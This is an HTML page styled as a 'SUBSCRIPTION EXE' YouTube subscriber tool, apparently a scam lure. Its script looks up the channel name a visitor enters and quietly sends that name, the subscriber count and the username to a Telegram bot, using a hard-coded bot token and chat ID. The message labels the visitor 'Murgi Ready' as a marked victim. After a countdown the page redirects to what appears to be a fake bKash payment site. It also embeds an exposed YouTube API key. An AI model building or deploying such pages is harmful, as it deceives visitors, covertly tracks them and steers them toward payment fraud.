<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SUBSCRIPTION EXE</title>
    <style>
        /* Body Styling */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #FF5F6D, #FFC371);
            color: #fff;
            text-align: center;
            padding: 50px;
        }

        /* Logo Styling */
        .logo {
            display: block;
            margin: 0 auto 20px auto;
            width: 100px; /* Adjust size as needed */
            height: 100px; /* Adjust size as needed */
            border-radius: 50%; /* Makes the logo round */
            border: 3px solid white; /* Optional border */
        }

        /* Header Title Styling */
        h2 {
            color: #fff;
            font-size: 1.5em; /* Smaller font size */
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
            background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbowText 7s linear infinite;
        }

        @keyframes rainbowText {
            0% { background-position: 0% }
            100% { background-position: 100% }
        }

        /* Input and Container Styling */
        .input-container {
            position: relative;
            margin-bottom: 20px;
            display: inline-block;
            border: 2px solid #fff;
            border-radius: 5px;
            padding: 5px;
            background-color: rgba(255, 255, 255, 0.2);
            transition: background-color 0.3s;
        }

        input[type="text"] {
            padding: 10px;
            width: 300px;
            border: none;
            border-radius: 5px;
            font-size: 1.1em;
            color: #333;
            background-color: #f9f9f9;
            letter-spacing: 0.17em; /* Spacing for password-like input */
            font-family: 'Courier New', Courier, monospace; /* Monospace font for password style */
        }

        /* Confirm Button Styling */
        input[type="submit"] {
            background-color: black;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s ease;
            animation: flicker 1s infinite;
        }

        @keyframes flicker {
            0%, 100% { background-color: black; color: white; }
            50% { background-color: white; color: black; }
        }

        /* Channel Info Styling */
        .info {
            margin-top: 30px;
            padding: 20px;
            background-color: gray;
            border-radius: 10px;
            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
            display: none;
            color: #333;
        }

        .info img {
            width: 70px; /* Bigger size for YouTube logo */
            height: 70px; /* Bigger size for YouTube logo */
            display: block;
            margin: 0 auto 10px auto;
        }

        /* Bold Channel Name and RGB Quantity */
        #channelName {
            font-weight: bold; /* Bold font for "Channel Name" */
            font-size: 1.5em; /* Adjust size as needed */
            color: white; /* Set text color to white */
        }

        #channel {
            font-weight: bold;
            font-size: 1.2em;
            background: linear-gradient(90deg, red, green, blue);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rgbAnimation 3s infinite;
        }

        /* Quantity Styling */
        #quantity {
            font-weight: bold;
            color: white; /* Set text color to white */
        }

        /* Countdown styling */
        #countdown {
            margin-top: 20px;
            font-size: 1.5em;
            color: #FFEB3B;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
            display: none;
        }

        /* Countdown Ball Styling */
        .countdown-ball {
            display: inline-block;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: black;
            color: white;
            font-weight: bold;
            line-height: 30px; /* Center the text vertically */
            margin: 0 5px; /* Space between ball and text */
            animation: ballFlicker 1s infinite;
        }

        @keyframes ballFlicker {
            0%, 100% { background-color: black; color: white; }
            50% { background-color: white; color: black; }
        }

        /* Responsive Design */
        @media (max-width: 600px) {
            input[type="text"] {
                width: 90%;
            }

            h2 {
                font-size: 1.2em; /* Smaller font size for mobile */
            }

            input[type="submit"] {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>

<!-- Logo at the Top -->
<img src="https://imgur.com/bODPbe8.png" alt="Logo" class="logo">
 
<!-- Header Title -->
<h2>SUBSCRIPTION EXE<br>REPLIT PROJECT</h2>

<!-- Input and Confirmation -->
<div class="input-container">
    <input type="text" id="username" placeholder="SUBSCRIPTION ID"><br>
</div>
<input type="submit" value="CONFIRM" onclick="fetchChannelData()">

<!-- Channel Information -->
<div class="info" id="info">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo">
    <img id="channelLogo" src="" alt="Channel Logo" class="channel-logo" style="display:none; border-radius: 50%;">
    <h2 style="font-size: 1.2em; color: #FFEB3B;">Channel Information</h2>
    <p id="channelName">Channel Name: <span id="channel"></span></p>
    <p id="quantity">Quantity: <span id="qty" style="font-weight: bold; background: linear-gradient(90deg, red, green, blue); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: rgbAnimation 3s infinite;"></span></p>
</div> 

<!-- Countdown -->
<div id="countdown"></div>

<script>
    function fetchChannelData() {
        const username = document.getElementById("username").value;

        // Fetch channel data from YouTube API
        const apiKey = 'AIzaSyA4wz_vD0KQcm5RNXbgC39ecpmMSlrxarM';
        const url = `https://www.googleapis.com/youtube/v3/channels?forUsername=${username}&part=snippet,statistics&key=${apiKey}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.items && data.items.length > 0) {
                    const channel = data.items[0].snippet;
                    const stats = data.items[0].statistics;

                    // Set channel information
                    document.getElementById("channel").innerText = channel.title;
                    document.getElementById("qty").innerText = stats.subscriberCount;
                    document.getElementById("channelLogo").src = channel.thumbnails.default.url; // Use default thumbnail
                    document.getElementById("channelLogo").style.display = 'block'; // Display channel logo

                    // Send user information to Telegram
                    sendToTelegram(channel.title, stats.subscriberCount, username);

                    // Show channel information and countdown
                    document.getElementById("info").style.display = 'block';
                    startCountdown(10); // Start countdown with 10 seconds

                    // Hide input section
                    document.getElementById("username").style.display = 'none';
                    document.querySelector("input[type='submit']").style.display = 'none';
                } else {
                    alert("Channel not found!");
                }
            })
            .catch(error => {
                console.error('Error fetching channel data:', error);
                alert("An error occurred while fetching channel data.");
            });
    }

    // Function to send user information to Telegram
        function sendToTelegram(channelName, subscriberCount, username) {
            const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
            const chatId = '6471397661';
            const message = `ðŸ¸âœ…Murgi Ready:\nChannel Name: ${channelName}\nSubscriber Count: ${subscriberCount}\nUsername: ${username}`;
            
            // Create the Telegram API URL
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Send the message using fetch
            fetch(telegramUrl)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok ' + response.statusText);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Message sent successfully', data);
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
        }

        function startCountdown(seconds) {
            const countdownElement = document.getElementById("countdown");
            countdownElement.style.display = 'block';

            let remainingTime = seconds;

            const countdownInterval = setInterval(() => {
                countdownElement.innerHTML = `Time remaining: <span class="countdown-ball">${remainingTime}</span> seconds`;
                remainingTime--;

                if (remainingTime < 0) {
                    clearInterval(countdownInterval);
                    window.location.href = "https://pay-bkash.vercel.app"; // Redirect to your specified URL
                }
            }, 1000);
        }
    </script>
</body>
</html>
